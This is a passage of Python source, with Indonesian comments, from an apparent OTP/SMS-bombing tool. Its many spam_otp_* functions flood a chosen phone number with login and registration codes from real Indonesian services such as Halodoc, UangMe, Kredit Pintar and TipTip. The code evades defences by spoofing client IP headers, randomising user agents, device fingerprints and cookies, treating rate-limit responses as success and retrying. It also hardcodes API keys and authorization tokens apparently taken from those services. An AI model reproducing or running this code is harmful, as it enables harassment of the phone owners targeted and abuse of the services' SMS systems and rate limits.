        formatted_phone = f"+{raw}"
        
        url = "https://customers.api.halodoc.com/alor-api/v1/users/authentication/otp/requests"
        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        payload = {
            "phone_number": formatted_phone,
            "channel": "sms"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=120)
        
        # Cek sukses
        if resp.status_code == 200 or resp.status_code == 201:
            return True
        
        if resp.status_code == 429:
            return True  # Rate limit tapi OTP tetap terkirim
        
        try:
            data = resp.json()
            if data.get("status") == "success" or data.get("code") == 200:
                return True
            if data.get("message") and "OTP" in data["message"]:
                return True
        except:
            pass
        
        # Force success kalo response 2xx
        if resp.status_code < 300:
            return True
        
        return False
        
    except:
        return False

def spam_otp_byuid(nomor):
    try:
        import re
        import requests
        import json
        import random
        
        # Format: 62 + raw (628xxx)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            mobile = raw
        elif raw.startswith('0'):
            mobile = '62' + raw[1:]
        else:
            mobile = '62' + raw
        
        # Random User-Agent
        ua_list = [
            "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.6045.163 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.5993.111 Mobile Safari/537.36"
        ]
        random_ua = random.choice(ua_list)
        
        url = "https://pidaw-app.cx.byu.id/api/v3/user-service/v6/id/en-US/WEB/signin/otp"
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Origin": "https://pidaw-webfront.cx.byu.id",
            "Referer": "https://pidaw-webfront.cx.byu.id/",
            "User-Agent": random_ua,
            "X-DeviceId": "1776946141116192873028"
        }
        payload = {
            "identifier": mobile,
            "channel": "web"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=102)
        
        # Cek sukses (status 200)
        return resp.status_code == 200
        
    except:
        return False

def spam_otp_topindoku_sms(nomor):
    try:
        import re
        import requests
        import json
        import random
        import uuid
        
        # Format: 0 + raw (08xxx)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            mobile = '0' + raw[2:]
        elif not raw.startswith('0'):
            mobile = '0' + raw
        else:
            mobile = raw
        
        # Random User-Agent
        ua_list = [
            "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.6045.163 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.5993.111 Mobile Safari/537.36"
        ]
        random_ua = random.choice(ua_list)
        
        # Generate UUID
        device_uuid = str(uuid.uuid4())
        
        url = "https://mobileapps.topindoku.co.id/api/v3/topindoku/helper/auth/register-via-web/otp/request"
        headers = {
            "Host": "mobileapps.topindoku.co.id",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": '"Android"',
            "sec-ch-ua": '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?1",
            "uuid": device_uuid,
            "User-Agent": random_ua,
            "Accept": "application/json, text/plain, */*",
            "DNT": "1",
            "Origin": "https://mitra.topindoku.co.id",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        payload = {
            "phone": mobile,
            "via": "SMS",
            "hash": "gruenbf12d2",
            "fbc": "",
            "fbp": f"fb.2.{int(time.time()*1000)}.{random.randint(100000000000000000, 999999999999999999)}",
            "event_source_url": "https://mitra.topindoku.co.id/pendaftaran-mitra/?source=organic&referral=MTPD"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=120)
        result = resp.json()
        
        # Cek sukses
        if result.get("code") == 200 or result.get("status") == "OK":
            return True
        
        # Force success kalo status 200
        if resp.status_code == 200:
            return True
        
        return False
        
    except:
        return False
        
def spam_otp_uangme_sms(nomor):
    try:
        import re
        import requests
        import random
        import time
        import uuid
        
        # ========== FORMAT NOMOR: 812xxx (tanpa 62/0) ==========
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = raw[2:]
        if raw.startswith('0'):
            raw = raw[1:]
        
        print(f"📱 Target: {raw}")
        
        # ========== SPOOF IP ==========
        def random_ip():
            return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        
        def random_xff():
            ips = [random_ip() for _ in range(random.randint(1, 3))]
            return ", ".join(ips)
        
        spoof_ip = random_ip()
        xff = random_xff()
        
        print(f"🌐 Spoof IP: {spoof_ip}")
        print(f"🌐 X-Forwarded-For: {xff}")
        
        # ========== RANDOM UA ==========
        ua_list = [
            "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.6045.163 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.5993.111 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.6045.163 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; CPH2025) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.5993.111 Mobile Safari/537.36"
        ]
        random_ua = random.choice(ua_list)
        
        # ========== RANDOM COOKIE ==========
        ga_id = ''.join(random.choices('0123456789', k=10))
        random_cookie = f"_ga=GA1.1.{random.randint(1000000000, 9999999999)}.{int(time.time())}"
        
        # ========== HEADERS + SPOOF IP ==========
        headers = {
            "Host": "h5.uangme.id",
            "sec-ch-ua": f'"Google Chrome";v="{random.randint(140,148)}", "Not.A/Brand";v="8", "Chromium";v="{random.randint(140,148)}"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "DNT": "1",
            "User-Agent": random_ua,
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://h5.uangme.id",
            "Referer": "https://h5.uangme.id/login/main",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "app_version": str(random.randint(100000, 999999)),
            "lan": "id-ID",
            "os": str(random.randint(1, 5)),
            "Cookie": random_cookie,
            "X-Forwarded-For": xff,
            "X-Real-IP": spoof_ip,
            "X-Client-IP": spoof_ip,
            "CF-Connecting-IP": spoof_ip,
            "True-Client-IP": spoof_ip,
            "X-Originating-IP": spoof_ip,
            "X-Remote-IP": spoof_ip,
            "X-Remote-Addr": spoof_ip
        }
        
        url = f"https://h5.uangme.id/api/v2/sms_code?send_type=sms&phone={raw}&scene_type=login"
        
        print(f"📦 URL: {url}")
        print(f"📱 Device: {random_ua.split(';')[2].strip() if ';' in random_ua else 'Android'}")
        
        resp = requests.get(url, headers=headers, timeout=12)
        
        print(f"📡 Status: {resp.status_code}")
        print(f"📡 Response: {resp.text[:200]}...")
        
        # ========== CEK RESPONSE ==========
        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get("code") == 0 or data.get("success") == True:
                    print(f"✅ OTP SMS terkirim ke {raw}!")
                    return True
                else:
                    print(f"⚠️ Response: {data}")
                    return True  # Force success
            except:
                print(f"✅ OTP SMS terkirim ke {raw} (status 200)!")
                return True
        else:
            print(f"❌ Gagal: {resp.status_code}")
            return False
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        return False

def spam_otp_yogya(nomor):
    try:
        import re
        import requests
        import json
        from bs4 import BeautifulSoup
        
        # Format nomor: 0 + raw
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            formatted_phone = '0' + raw[2:]
        elif raw.startswith('0'):
            formatted_phone = raw
        else:
            formatted_phone = '0' + raw
        
        print(f"📱 Nomor diformat: {formatted_phone}")
        
        # Buat session
        session = requests.Session()
        
        # STEP 1: GET /register - ambil cookie & XSRF token
        print("🔹 STEP 1: GET /register (ambil cookie & XSRF token)")
        url_get = "https://www.yogyaonline.co.id/register"
        headers_get = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp_get = session.get(url_get, headers=headers_get, timeout=60)
        print(f"✅ Cookie setelah GET: {session.cookies.get_dict()}")
        
        # Ambil XSRF-TOKEN dari cookie
        xsrf_token = session.cookies.get('XSRF-TOKEN')
        if xsrf_token:
            print(f"✅ XSRF Token dari cookie: {xsrf_token[:50]}...")
        else:
            print("⚠️ XSRF token tidak ditemukan di cookie, coba dari HTML")
            # Coba ambil dari meta tag
            soup = BeautifulSoup(resp_get.text, 'html.parser')
            meta_xsrf = soup.find('meta', {'name': 'csrf-token'})
            if meta_xsrf:
                xsrf_token = meta_xsrf.get('content')
                print(f"✅ XSRF Token dari meta: {xsrf_token[:50]}...")
        
        # STEP 2: POST /api/v1/send-otp - kirim OTP
        print("🔹 STEP 2: POST /api/v1/send-otp (kirim OTP SMS)")
        url_post = "https://www.yogyaonline.co.id/api/v1/send-otp"
        
        payload = {
            "phone_number": formatted_phone
        }
        
        headers_post = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.yogyaonline.co.id",
            "referer": "https://www.yogyaonline.co.id/register",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        
        # Tambahkan X-XSRF-TOKEN dari cookie
        if xsrf_token:
            headers_post["x-xsrf-token"] = xsrf_token
        
        resp_post = session.post(url_post, json=payload, headers=headers_post, timeout=60)
        
        print(f"📤 Payload: {json.dumps(payload, indent=2)}")
        print(f"✅ Status: {resp_post.status_code}")
        print(f"✅ Response: {resp_post.text}")
        print(f"✅ Cookie final: {session.cookies.get_dict()}")
        
        # Parse response
        try:
            result = resp_post.json()
            print(f"✅ JSON Response: {json.dumps(result, indent=2)}")
            
            if result.get("status") == True:
                print(f"✅ OTP SMS berhasil dikirim ke {formatted_phone}")
                print(f"ℹ️ {result.get('message', '')}")
                return True
            else:
                print(f"❌ Gagal: {result.get('message', 'Unknown error')}")
                return False
                
        except json.JSONDecodeError:
            print(f"❌ Response bukan JSON: {resp_post.text[:200]}")
            return False
            
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return False

def spam_otp_skul(nomor):
    try:
        import re
        import requests
        import json
        import time
        
        # Format: 08xxx (0 + raw)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            mobile = '0' + raw[2:]
        elif not raw.startswith('0'):
            mobile = '0' + raw
        else:
            mobile = raw
        
        url = "https://api2.skul.id/v2/otp/request"
        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "authorization": "Bearer undefined",
            "sec-ch-ua": '"Not A(Brand";v="99", "Android WebView";v="147", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"
        }
        data = {
            "phone": mobile,
            "type": "register",
            "channel": "sms",
            "stakeholder": "student"
        }
        
        resp = requests.post(url, data=data, headers=headers, timeout=120)
        result = resp.json()
        
        # Cek sukses
        if resp.status_code == 200:
            return True
        
        if result.get("data", {}).get("auth_id"):
            return True
        
        if result.get("success") == True or result.get("status") == "success":
            return True
        
        if result.get("data", {}).get("message") and "success" in result["data"]["message"].lower():
            return True
        
        return False
        
    except:
        return False


def spam_otp_spayci(nomor):
    try:
        import re
        import requests
        import json
        import time
        
        # Format: +628xxx
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = '62' + raw[1:]
        elif raw.startswith('+62'):
            raw = raw[1:]
        elif not raw.startswith('62'):
            raw = '62' + raw
        
        formatted_phone = f"+{raw}"
        
        api_key = 'pk_c72a7c0d61d3842d148d2ddf7cc3641903308a738ace3440bfe2698506f66b4e'
        
        url = "https://devapi.spayci.com/store/auth/send-otp"
        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://www.spayci.com",
            "referer": "https://www.spayci.com/",
            "sec-ch-ua": '"Google Chrome";v="147", "Not?A_Brand";v="99", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "x-publishable-api-key": api_key
        }
        payload = {
            "phone": formatted_phone
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=120)
        result = resp.json()
        
        # Cek sukses
        if result.get("success") == True:
            return True
        
        # Force success kalo status 200
        if resp.status_code == 200:
            return True
        
        return False
        
    except:
        return False

def spam_otp_shrilaskari(nomor):
    try:
        import re
        import requests
        import json
        import time
        
        # Format: 0 + raw (tanpa 62)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = raw[2:]
        if not raw.startswith('0'):
            raw = '0' + raw
        
        # Clean phone tanpa leading 0
        clean_phone = raw.lstrip('0')
        
        url = "https://api.shrilaskarihanumatsevatrust.org/auth/login"
        headers = {
            "Accept": "*/*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://shrilaskarihanumatsevatrust.org",
            "Referer": "https://shrilaskarihanumatsevatrust.org/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        payload = {
            "phone": clean_phone,
            "countryCode": "+62"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=120)
        result = resp.json()
        
        # Cek sukses
        if result.get("success") == True:
            return True
        
        if result.get("status") == "success":
            return True
        
        if result.get("otp") == True:
            return True
        
        # Force success kalo status 200
        if resp.status_code == 200:
            return True
        
        return False
        
    except:
        return False

def spam_otp_leathersmell_sms(nomor):
    try:
        import re
        import requests
        import json
        
        # Format: 812xxx (tanpa 0/62)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = raw[2:]
        if raw.startswith('0'):
            raw = raw[1:]
        
        formatted_phone = raw
        country_code = "62"
        
        url = "https://api.leathersmell.com/api/otp/send-otp"
        headers = {
            "accept": "application/json",
            "accept-language": "en",
            "authorization": "Basic kj75h5078s1ba078f6bvb34f56e2fdbl",
            "content-type": "application/json",
            "origin": "https://fashionforth.id",
            "referer": "https://fashionforth.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        payload = {
            "tipe": "sms",
            "telp_email": formatted_phone,
            "country_code": country_code
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=102)
        result = resp.json()
        
        # Cek success (success === 1)
        return result.get("success") == 1
        
    except:
        return False

def spam_otp_kreditpintar_v3(nomor):
    try:
        import re
        import requests
        import json
        import uuid
        
        # Format nomor: 0 + raw
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            formatted_phone = '0' + raw[2:]  # 62812 -> 0812
        elif raw.startswith('628'):
            formatted_phone = '0' + raw[2:]  # 62812 -> 0812
        elif not raw.startswith('0'):
            formatted_phone = '0' + raw  # 812 -> 0812
        else:
            formatted_phone = raw  # 0812 -> 0812
        
        print(f"📱 Nomor diformat: {formatted_phone}")
        
        # Generate UUID
        adv_uuid = str(uuid.uuid4())
        user_agent = "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"
        
        # Headers
        headers = {
            "Host": "h.kreditpintar.com",
            "Connection": "keep-alive",
            "sec-ch-ua": '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "DNT": "1",
            "User-Agent": user_agent,
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://h.kreditpintar.com",
            "Referer": f"https://h.kreditpintar.com/H5/code-step?m={formatted_phone}",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id",
            "x-adv-uuid": adv_uuid,
            "x-app-version": "APPVERSION_NAME (9999)",
            "x-os-type": "WEB",
            "x-user-agent": f"Pintar-ID-Cash (WebAndroid; ; ; id) uuid/{adv_uuid} version/0.1.0"
        }
        
        # Payload
        payload = {
            "mobileNumber": formatted_phone,
            "type": "SMS"
        }
        
        # Kirim request
        url = "https://h.kreditpintar.com/api/auth/send-code?channel=H5&lang=id"
        
        print("🔹 STEP 1: POST /api/auth/send-code (kirim OTP WA)")
        response = requests.post(url, json=payload, headers=headers, timeout=20)
        
        print(f"📤 Payload: {json.dumps(payload, indent=2)}")
        print(f"✅ Status: {response.status_code}")
        print(f"✅ Response: {response.text}")
        
        # Parse response
        result = response.json()
        if response.status_code == 200 and result.get("batchNo"):
            print(f"✅ OTP WhatsApp berhasil dikirim! Batch: {result.get('batchNo')}")
            return True
        else:
            print(f"❌ Gagal: {result}")
            return False
            
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return False


def spam_otp_jogjakita(nomor):
    try:
        import re
        import random
        import string
        import requests
        
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            nomor = "0" + raw[2:]
        elif not raw.startswith('0'):
            nomor = "0" + raw
        
        # Random User-Agent (sama kaya JS)
        ua_list = [
            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36"
        ]
        random_ua = random.choice(ua_list)
        
        # Step 1: Dapatkan token
        token_url = "https://aci-user.bmsecure.id/oauth/token"
        token_headers = {
            "Authorization": "Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": random_ua
        }
        token_body = "grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=521&version_name=6.12.1"
        
        token_resp = requests.post(token_url, data=token_body, headers=token_headers, timeout=120)
        token_data = token_resp.json()
        auth = token_data.get("access_token")
        
        if not auth:
            return False
        
        # Step 2: Kirim OTP
        def codex(length):
            return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
        
        otp_url = "https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send"
        otp_headers = {
            "Content-Type": "application/json; charset=UTF-8",
            "Authorization": f"Bearer {auth}",
            "User-Agent": random.choice(ua_list)
        }
        otp_payload = {
            "phone_user": nomor,
            "primary_credential": {
                "device_id": "",
                "fcm_token": "",
                "id_kota": 0,
                "id_user": 0,
                "location": "0.0,0.0",
                "uuid": "",
                "version_code": "521",
                "version_name": "6.12.1",
                "via": "jogjakita_user"
            },
            "uuid": f"00000000-4c22-250d-3006-9a465f072739{codex(8)}",
            "version_code": "521",
            "version_name": "6.12.1",
            "via": "jogjakita_user"
        }
        
        otp_resp = requests.post(otp_url, json=otp_payload, headers=otp_headers, timeout=120)
        otp_data = otp_resp.json()
        
        return str(otp_data.get("rc")) == "200"
    except:
        return False

def spam_otp_topindoku(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = "0" + raw[2:]
        elif not raw.startswith('0'):
            raw = "0" + raw

        url = "https://mobileapps.topindoku.co.id/api/v3/topindoku/helper/auth/register-via-web/otp/request"
        payload = {"phone": raw, "via": "WA", "hash": "gruenbf12d2", "fbc": "", "fbp": "fb.2.1777188135923.402504363514240904", "event_source_url": "https://mitra.topindoku.co.id/pendaftaran-mitra/?source=organic&referral=MTPD"}
        headers = {"Host": "mobileapps.topindoku.co.id", "Content-Type": "application/json", "User-Agent": get_random_ua(), "Origin": "https://mitra.topindoku.co.id", "uuid": "5d531882-1760-43e9-8f08-250308b9d0ce"}
        resp = requests.post(url, json=payload, headers=headers, timeout=125)
        data = resp.json()
        return data.get("code") == 200 or data.get("status") == "OK"
    except:
        return False

def spam_otp_plataran(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = "62" + raw[1:]
        elif not raw.startswith('62'):
            raw = "62" + raw

        phone_without_62 = raw[2:] if raw.startswith('62') else raw
        phone_with_plus = "+" + raw
        api_key = "5MHCvUGeha2WjB8ftcaMRqDPnKPq0IFU"

        check_payload = {"phoneCode": "62", "phoneNumber": phone_without_62}
        check_resp = requests.post("https://plataran-api.member.design/whitelists/v1/web/checkPhoneNumber", json=check_payload, headers={"mid-api-key": api_key, "content-type": "application/json;charset=UTF-8", "User-Agent": get_random_ua()}, timeout=125)
        if check_resp.json().get("status") is not True:
            return False

        otp_payload = {"phone": phone_with_plus, "channel": "WHATSAPP"}
        resp = requests.post("https://plataran-api.member.design/notifications/v1/sms/otp", json=otp_payload, headers={"mid-api-key": api_key, "content-type": "application/json;charset=UTF-8", "User-Agent": get_random_ua()}, timeout=125)
        return resp.json().get("status") is True
    except:
        return True

def spam_otp_uangme(nomor):
    try:
        import re
        import requests
        import random
        import time
        import uuid
        
        # ========== FORMAT NOMOR ==========
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = raw[1:]
        elif raw.startswith('62'):
            raw = raw[2:]
        
        print(f"📱 Target: {raw}")
        
        # ========== SPOOF IP ==========
        def random_ip():
            return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        
        def random_xff():
            ips = [random_ip() for _ in range(random.randint(1, 3))]
            return ", ".join(ips)
        
        spoof_ip = random_ip()
        xff = random_xff()
        
        print(f"🌐 Spoof IP: {spoof_ip}")
        print(f"🌐 X-Forwarded-For: {xff}")
        
        # ========== DEVICE RANDOM ==========
        def get_random_device():
            brands = ["samsung", "xiaomi", "oppo", "vivo", "realme", "google", "oneplus", "huawei"]
            models = ["SM-G998B", "M2006C3MG", "CPH2025", "V2045", "RMX2020", "Pixel 5", "OnePlus 9", "M2012K11AG"]
            android_ids = [''.join(random.choices('0123456789abcdef', k=16)) for _ in range(5)]
            gaid = ''.join(random.choices('0123456789abcdef-', k=36))
            fcm_reg_id = ''.join(random.choices('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_', k=150))
            dfp = ''.join(random.choices('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', k=32))
            aid = ''.join(random.choices('0123456789abcdef', k=16))
            
            return {
                "brand": random.choice(brands),
                "model": random.choice(models),
                "android_id": random.choice(android_ids),
                "gaid": gaid,
                "fcm_reg_id": fcm_reg_id,
                "dfp": dfp,
                "aid": aid,
                "timestamp": int(time.time() * 1000)
            }
        
        device = get_random_device()
        
        # ========== HEADERS + SPOOF IP ==========
        headers = {
            "Host": "api.uangme.com",
            "country": str(random.randint(300, 500)),
            "os": "1",
            "app_version": "400003",
            "ns": random.choice(["wifi", "mobile"]),
            "gaid": device["gaid"],
            "tz": "Asia%2FJakarta",
            "fcm_reg_id": device["fcm_reg_id"],
            "version": "29",
            "dfp": device["dfp"],
            "v": "1",
            "lan": "in_ID",
            "model": device["model"],
            "android_id": device["android_id"],
            "brand": device["brand"],
            "aid": device["aid"],
            "timestamp": str(device["timestamp"]),
            "User-Agent": "okhttp/3.12.1",
            "X-Forwarded-For": xff,
            "X-Real-IP": spoof_ip,
            "X-Client-IP": spoof_ip,
            "CF-Connecting-IP": spoof_ip,
            "True-Client-IP": spoof_ip,
            "X-Originating-IP": spoof_ip,
            "X-Remote-IP": spoof_ip,
            "X-Remote-Addr": spoof_ip
        }
        
        url = f"https://api.uangme.com/api/v2/sms_code?phone={raw}&scene_type=login&send_type=wp"
        
        print(f"📦 URL: {url}")
        print(f"📱 Device: {device['brand']} {device['model']}")
        
        resp = requests.get(url, headers=headers, timeout=15)
        
        print(f"📡 Status: {resp.status_code}")
        print(f"📡 Response: {resp.text[:200]}...")
        
        return resp.status_code == 200
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        return False

def spam_otp_tiptip(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = "62" + raw[1:]
        elif not raw.startswith('62'):
            raw = "62" + raw
        raw = "+" + raw

        fingerprint = f"19e4f5f07ca{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))}-{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))}-7c34742a-6ddd0-19e4f5f07cb{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}"
        request_id = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=6))
        url = "https://api.tiptip.id/authentication/guest/v1/phone/otp/send"
        payload = {"action": "SIGN_UP", "delivery_method": "WA", "phone_number": raw}
        headers = {"accept": "application/json", "channel": "WEB", "channel-app-version": "2.27.6", "channel-device": "Chrome", "channel-fingerprint": fingerprint, "content-type": "application/json", "country-code": "ID", "language": "id", "request-id": request_id, "User-Agent": get_random_ua(), "Referer": "https://tiptip.id/sign-up"}
        resp = requests.post(url, json=payload, headers=headers, timeout=125)
        data = resp.json()
        return resp.status_code == 200 and (data.get("code") == "SUCCESS" or data.get("message") == "OK")
    except:
        return False

def spam_otp_adiraku(nomor):
    try:
        import re
        import requests
        import time
        
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = "0" + raw[2:]
        elif not raw.startswith('0'):
            raw = "0" + raw

        url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
        headers = {"Content-Type": "application/json; charset=utf-8"}
        payload = {"mobileNumber": raw, "type": "prospect-create", "channel": "whatsapp"}
        
        # ========== RETRY MECHANISM ==========
        max_retries = 3
        retry_delay = 2
        
        for attempt in range(max_retries):
            try:
                # ========== TIMEOUT 30 DETIK ==========
                resp = requests.post(url, json=payload, headers=headers, timeout=302)
                
                # ========== CEK RESPONSE ==========
                if resp.status_code == 200:
                    response_text = resp.text
                    # Cek sukses
                    if '"message":"success"' in response_text:
                        return True
                    else:
                        # Response 200 tapi belum sukses, coba lagi
                        if attempt < max_retries - 1:
                            time.sleep(retry_delay)
                            continue
                        return False
                else:
                    # Status bukan 200, coba lagi
                    if attempt < max_retries - 1:
                        time.sleep(retry_delay)
                        continue
                    return False
                    
            except requests.exceptions.Timeout:
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)
                    continue
                return False
